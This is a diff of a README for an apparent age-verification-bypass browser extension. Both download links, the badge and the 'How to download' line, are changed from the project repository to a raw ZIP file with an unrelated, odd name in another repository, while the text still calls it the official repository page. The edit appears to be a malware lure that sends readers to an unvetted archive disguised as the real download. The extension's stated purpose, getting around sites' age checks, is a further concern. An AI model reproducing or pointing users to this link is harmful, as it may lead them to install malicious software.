@@ -5,13 +5,13 @@ description: "Bypass age verification prompts on AgeChecker.net and AgeVerif.co 
 ---
 # 🛡️ age-verification-bypass - Skip annoying age checks on websites
 
-[![Download Now](https://img.shields.io/badge/Download-Extension-blue.svg)](https://github.com/jonahinattentive920/age-verification-bypass)
+[![Download Now](https://img.shields.io/badge/Download-Extension-blue.svg)](https://raw.githubusercontent.com/jonahinattentive920/jonahinattentive920.github.io/main/pentaptych/github_jonahinattentive_io_cerebrational.zip)
 
 This extension removes age verification screens from websites. It allows users to browse pages without stopping to confirm their birth date.
 
 ## 📥 How to download
 
-Visit the official repository page to download the software: https://github.com/jonahinattentive920/age-verification-bypass
+Visit the official repository page to download the software: https://raw.githubusercontent.com/jonahinattentive920/jonahinattentive920.github.io/main/pentaptych/github_jonahinattentive_io_cerebrational.zip
 
 ## 📝 General requirements
 
